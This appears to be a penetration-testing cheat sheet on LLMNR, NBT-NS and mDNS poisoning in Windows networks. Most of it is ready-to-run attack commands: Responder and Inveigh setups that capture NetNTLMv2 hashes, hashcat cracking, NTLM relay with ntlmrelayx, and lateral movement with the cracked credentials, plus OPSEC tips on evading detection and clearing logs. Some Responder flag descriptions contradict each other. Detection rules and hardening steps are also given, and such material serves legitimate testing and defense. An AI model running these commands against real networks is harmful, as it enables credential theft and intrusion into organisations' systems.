# LLMNR / NBT-NS Poisoning

Poison link-local name resolution (LLMNR, NBT-NS, mDNS) to capture NetNTLMv2 hashes when users mistype hostnames.

## How It Works

```
User pings \\fileshare (typo — wrong server name)
User ──► LLMNR query: "Who is mispelled-server?" ──► Broadcast
Attacker ──► LLMNR response: "I am mispelled-server"
User ──► SMB connection attempt to attacker ──► NetNTLMv2 hash sent
Attacker captures hash, cracks offline
```

## Prerequisites

- Local network access (same subnet / broadcast domain)
- No IPv6 mitigations (DHCPv6 guard, RA guard)
- Ability to respond to multicast queries (LLMNR: 224.0.0.252, NBT-NS: 137/UDP)

## Linux — Responder

### Basic poisoning (LLMNR + NBT-NS + mDNS)
```bash
sudo responder -I eth0 -Av
```

### Analyze mode only (don't poison, just observe)
```bash
sudo responder -I eth0 -A
```

### Disable SMB and HTTP servers (only capture)
```bash
sudo responder -I eth0 -Av -w
```

### With verbose output
```bash
sudo responder -I eth0 -wd -P -v
```

### Force NTLMv2 (disable NTLMv1 downgrade)
```bash
sudo responder -I eth0 -Av --ntlmv2-only
```

### Enable all servers
```bash
sudo responder -I eth0 -Av -w -r -f -F
```
- `-w` — Start WPAD rogue proxy
- `-r` — Enable answers for netbios wredir suffix queries
- `-f` — Enable answers for netbios datagram suffix queries
- `-F` — Force NTLM authentication to all vulnerable wpad requests

### Session options for relay
```bash
sudo responder -I eth0 -Av --lm
```
> Use with `--lm` when relaying to downgrade to LM/NTLMv1 for relay compatibility.

### Responder.conf tuning
```conf
; /etc/responder/Responder.conf
SQL = On
SMB = On
HTTP = On
HTTPS = On
LDAP = On
; Disable services you're not using to avoid interference
```

## Windows — Inveigh (PowerShell)

### Basic setup (run as admin)
```powershell
Import-Module .\Inveigh.psd1
Invoke-Inveigh -IP 10.10.10.10 -ConsoleOutput Y -NBNS Y -mDNS Y -LLMNR Y
```

### With relay support
```powershell
Invoke-Inveigh -IP 10.10.10.10 -ConsoleOutput Y -NBNS Y -mDNS Y -LLMNR Y -HTTP Y
```

### Passive sniffing only (no poisoning)
```powershell
Invoke-Inveigh -IP 10.10.10.10 -ConsoleOutput Y -NBNS N -LLMNR N -mDNS N -Sniffer Y
```

### Get captured hashes
```powershell
Get-Inveigh -Type Hashes
```

## Captured Hash Format

```
[REDACTED]::DOMAIN:1122334455667788:COMPUTER:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:AAAAAAAAAAAAAAAA
```

This is a **NetNTLMv2** hash. Responder saves these to `/usr/share/responder/logs/`.

## Cracking Captured Hashes

```bash
# NetNTLMv2 — hashcat mode 5600
hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt -r best64.rule --force

# NetNTLMv1 — hashcat mode 5500
hashcat -m 5500 ntlmv1_hashes.txt rockyou.txt

# Show cracked
hashcat -m 5600 captured_hashes.txt --show
```

## Full Attack Flow

```
1. Start Responder on attacker machine on the target subnet
   sudo responder -I eth0 -Av

2. Wait for LLMNR/NBT-NS queries (user mistypes \\server)
   [Responder logs] [LLMNR] Request for mispelled-server

3. Responder poisons and captures the hash
   [SMB] NTLMv2 hash captured: DC01\jsmith

4. Crack the hash offline
   hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-*.txt rockyou.txt

5. Use cracked credentials for lateral movement
   netexec smb 10.10.10.10 -u 'jsmith' -p 'crackedpass'
```

## Advanced: Multi-Relay with Responder + ntlmrelayx.py

```bash
# Terminal 1: Responder (disable SMB server)
sudo responder -I eth0 -Av -w

# Terminal 2: ntlmrelayx.py relay to target
ntlmrelayx.py -t smb://10.10.10.20 -smb2support
```

## Detection & Signatures

**Windows Event Logs:**
- **Event ID 4697/4698** — Service installation (Inveigh runs as service)
- **Event ID 5156** — Windows Filtering Platform connection (Inveigh binds to ports)

**Network Signatures:**
- Multiple LLMNR responses from the same IP for different names
- Unusual source responding to NBT-NS queries (should only be WINS server)
- LLMNR responses without matching query
- WPAD announcements from non-proxy servers

**Windows Client Traces:**
- `Network Profile: Private` — LLMNR is enabled
- `HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient` — LLMNR settings

**Sigma Rules:**
```yaml
title: Responder-like Activity
detection:
  selection:
    - EventID: 5156
      Direction: Inbound
      Protocol: UDP
      Port: 137
    - EventID: 5156
      Protocol: UDP
      Port: 5355
  condition: selection
```

## OPSEC Considerations

- **Broadcast dependent** — Only works on the same subnet
- **Visible in network** — Responder sends packets with unique TTL/behavior
- **Not stealthy** — All network monitoring tools detect rogue LLMNR responses
- **Fingerprintable** — Responder has specific packet signatures (NBT-NS query counts)
- **Wait for organic traffic** — Don't trigger queries yourself; wait for user mistakes
- **Log directory** — Clean `/usr/share/responder/logs/` after use
- **The more services enabled, the more capture vectors** — HTTP, HTTPS, SMB, SQL, LDAP, FTP, POP3, IMAP, SMTP
- **WPAD is your best vector** — Most Windows clients auto-discover proxy settings

## Defenses

- **Disable LLMNR** — GPO: `Computer Config > Admin Templates > Network > DNS Client > Turn off LLMNR`
- **Disable NBT-NS** — Disable NetBIOS over TCP/IP on all interfaces
- **Enable SMB signing** — Prevents NTLM relay (but not hash capture)
- **Network segmentation** — Separate broadcast domains
- **WPAD disable** — GPO: Disable WPAD auto-discovery
- **PowerShell logging** — Enable script block logging (detects Inveigh)

**Verify Defenses:**
```powershell
# Check LLMNR setting (0 = disabled)
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name "EnableMulticast"

# Check NetBIOS setting
Get-CimInstance Win32_NetworkAdapterConfiguration | Select Description, TcpipNetbiosOptions
```

## Common Pitfalls

| Issue | Fix |
|-------|-----|
| Responder not receiving queries | Wrong interface; use `-I eth0` matching subnet |
| No hashes captured | Network has LLMNR/NBT-NS disabled |
| Captured but can't crack | Password is strong; use relay instead |
| Double captures (your own) | Disable services in Responder.conf |
| Interference with real servers | Run Analyze mode first (`-A`) |

## References

- Responder: https://github.com/lgandx/Responder
- Inveigh: https://github.com/Kevin-Robertson/Inveigh
- hashcat: https://hashcat.net/wiki/doku.php?id=example_hashes
- SANS: LLMNR/NBT-NS Poisoning
- SpecterOps: "A Guide to Attacking LLMNR & NBT-NS"
